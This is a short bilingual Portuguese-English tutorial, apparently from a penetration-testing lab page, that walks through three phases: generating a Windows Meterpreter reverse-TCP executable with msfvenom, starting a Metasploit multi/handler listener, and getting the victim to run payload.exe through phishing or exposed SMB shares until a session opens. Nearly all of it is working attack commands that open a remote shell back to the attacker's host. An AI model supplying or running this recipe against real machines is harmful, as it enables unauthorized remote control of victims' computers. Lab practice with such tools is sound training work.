Fase 1

Gerar Payload Reverso (msfvenom)Generate Reverse Payload (msfvenom)

O msfvenom é a ferramenta usada para gerar payloads em diversos formatos (Windows exe, Linux elf, PHP, ASPX). Geraremos um executável reverso do Meterpreter que se conectará de volta à nossa máquina Kali. msfvenom is used to build payloads in multiple formats (Windows exe, Linux elf, PHP, ASPX). We will generate a reverse Meterpreter executable that connects back to our Kali machine.

Criar ExecutávelCreate Executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe
Fase 2

Configurar Ouvinte (multi/handler)Configure Listener (multi/handler)

Precisamos abrir uma porta no Kali para aguardar a conexão do payload. Usamos o módulo exploit/multi/handler no console do Metasploit. We need to open a listening port on Kali to wait for the payload connection. We use the exploit/multi/handler module in the Metasploit console.

msfconsole
1. Iniciar console do Metasploit:1. Start Metasploit console:
msfconsole -q
2. Executar comandos de configuração dentro do console:2. Run configuration commands inside the console:
use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; run
Fase 3

Execução e ExploraçãoExecution & Exploitation

Transfira o executável gerado (payload.exe) para o ambiente de testes da vítima (via e-mail de phishing, compartilhamento SMB vulnerável, etc.) e execute-o. Assim que rodar, você receberá a sessão do Meterpreter no console da Fase 2. Transfer the generated file (payload.exe) to the target testing machine (via phishing, vulnerable SMB shares, etc.) and run it. As soon as it runs, you will get a Meterpreter session in the Phase 2 console.

A mensagem "Meterpreter session 1 opened" indica que o sistema foi comprometido com sucesso.The message "Meterpreter session 1 opened" indicates the host is successfully compromised.
